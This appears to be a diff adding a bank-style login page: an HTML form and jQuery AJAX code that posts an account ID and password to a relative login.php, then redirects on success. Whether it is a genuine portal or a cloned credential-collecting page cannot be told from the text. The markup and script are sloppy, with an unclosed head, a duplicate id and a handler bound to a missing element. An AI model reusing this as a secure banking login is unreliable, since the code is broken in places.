@@ -1,0 +1,144 @@
+
+
+<html lang="en">
+ <head>
+     
+     
+  <body>   
+     
+     
+
+
+
+  
+          
+          
+          <form id="loginform" class="form-horizontal form-material" autocomplete="off" >
+                    				<input type="text" name="account" required="" class="input" id="user_login" autocomplete="off" placeholder="User ID" style="color: black">
+                    				<input type="password"  required="" id="passwrd" name="passwrd"  class="input" id="user_pass" autocomplete="off" required="" placeholder="Password" style="color: black">
+                    				
+                    				
+                                    
+                                                          
+    <div id="ctl03_pnlButtons" class="ActionButtons Action">
+        <div class="forminfo" style="display: none;"><span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;">
+INVALID PIN NUMBER ENTERED</span></div>
+        
+        <input type="submit" name="login_btn" value="Log In" onclick="__doPostBack(&#39;ctl03$sbmNextButton&#39;,&#39;&#39;);document.getElementById(&#39;ctl03_sbmNextButton&#39;).disabled = true;" id="ctl03_sbmNextButton" class="green-btn green-btn-sm green-btn-white link-off" />
+         <input type="checkbox" class="checkbox" checked id="remember_me">
+                    				<label for="remember_me">Remember me</label>
+                    			</form>
+  
+
+ </body>
+         
+         
+    <script src='//production-assets.codepen.io/assets/common/stopExecutionOnTimeout-b2a7b3fe212eaa732349046d8416e00a9dec26eb7fd347590fbced3ab38af52e.js'></script><script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+<script >/* LOGIN - MAIN.JS - dp 2017 */
+
+// LOGIN TABS
+
+// SLIDESHOW
+$(function() {
+	$('#slideshow > div:gt(0)').hide();
+	setInterval(function() {
+		$('#slideshow > div:first')
+		.fadeOut(1000)
+		.next()
+		.fadeIn(1000)
+		.end()
+		.appendTo('#slideshow');
+	}, 3850);
+});
+
+// CUSTOM JQUERY FUNCTION FOR SWAPPING CLASSES
+(function($) {
+	'use strict';
+	$.fn.swapClass = function(remove, add) {
+		this.removeClass(remove).addClass(add);
+		return this;
+	};
+}(jQuery));
+
+// SHOW/HIDE PANEL ROUTINE (needs better methods)
+
+// DISPLAY MSSG
+
+
+// DISABLE SUBMIT FOR DEMO
+$(function() {
+	$('.button').on('click', function(event) {
+		$(this).stop();
+		event.preventDefault();
+		return false;
+	});
+});
+//# sourceURL=pen.js
+</script>
+
+ <script type="text/javascript">
+$(document).ready(function(){   
+$('#submit').click(function(){
+	var account = $('#account').val();
+
+
+	// chk for name and pass them out.
+
+	if (account == '') {
+		 $('.forminfo').html('<span style="background-color: red; color:#FFFFFF; padding: 5px; text-align: center; width: 100%;"> PIN NUMBER FIELD IS EMPTY..</span>');
+	} else{
+		$.ajax({
+			url: "internet-banking/login.php?action=Check username",
+			method: "POST",
+			data:{ account: account},
+			dataType:"text",
+			 beforeSend:function()
+			    {
+			        $('.forminfo').html('<span style="background-color: blue;   color:#FFFFFF; padding: 5px; text-align: center; width: 100%;">Processing your information...</span>');
+			    },
+			success:function(data){
+			if(data==1){
+               $('.pwgrp').fadeIn(300);
+               $('.forminfo').hide();
+               $('#btnContinue').show();
+               $('#submit').hide();
+            }else{
+            $('.forminfo').fadeIn().html('<span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;">INVALID PIN NUMBER ENTERED</span>');
+			$('.forminfo').delay(5000).fadeOut('slow');
+				}
+                }
+			});
+	}
+    return false;
+});
+ 
+//Final submiton validation
+
+$('#loginform').bind("submit", function(){
+
+var frmdata = $(this).serialize();
+$.ajax({
+            url: "internet-banking/login.php?action=login user",
+            method: "POST",
+            data: frmdata,
+            dataType:"text",
+             beforeSend:function()
+                {
+                    $('.forminfo').fadeIn().html('<span style="background-color: blue;   color:#FFFFFF; padding: 5px; text-align: center; width: 100%;">Processing your information...</span>');
+                },
+            success:function(data){
+            if(data==1){
+            window.location="internet-banking/success.php?rd=secure-redirect";
+            }else{
+            $('.forminfo').fadeIn().html('<span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;">INVALID CUSTOMER DETAILS</span>');
+            $('.forminfo').delay(5000).fadeOut('slow');
+                }
+                }
+            });
+return false;
+})
+
+ })
+</script>
+
+
